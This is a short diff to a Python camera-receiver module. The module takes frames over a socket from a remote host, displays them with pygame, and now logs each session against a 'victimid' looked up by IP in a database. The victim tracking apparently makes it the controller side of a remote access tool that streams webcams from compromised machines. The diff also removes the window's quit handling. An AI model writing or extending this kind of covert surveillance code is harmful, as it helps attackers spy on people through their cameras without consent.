@@ -8,6 +8,8 @@ import select
 import numpy as np
 import cv2
 
+from datetime import datetime
+from database.connect.connect import *
 
 def recvall(sock, size):
     buf = b''
@@ -25,7 +27,6 @@ def recvall(sock, size):
     except Exception as e:
         print(f"Error in recvall: {e}")
         return None
-
 
 
 class CameraReceiver:
@@ -100,7 +101,6 @@ class CameraReceiver:
         finally:
             self.running = False
 
-
     def start(self):
         self.running = True
         self.receive_thread = threading.Thread(target=self.receive_frames)
@@ -128,15 +128,12 @@ class CameraReceiver:
             if self.double_buffer:
                 pygame.display.update([self.screen_panel_rect])
 
-            for event in pygame.event.get():
-                if event.type == pygame.QUIT:
-                    self.stop()
-
-        pygame.quit()
-
-
 def camerareceiver(host, port=5002):
     receiver = CameraReceiver(host, port)
     receiver.start()
     threading.Thread(target=receiver.update_screen, daemon=True).start()
+    execution_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    victimid = get_victimid_by_ip(host)
+    conn = connect_to_database()
+    insert_log(conn, victimid, "Camera", execution_time)
     return receiver
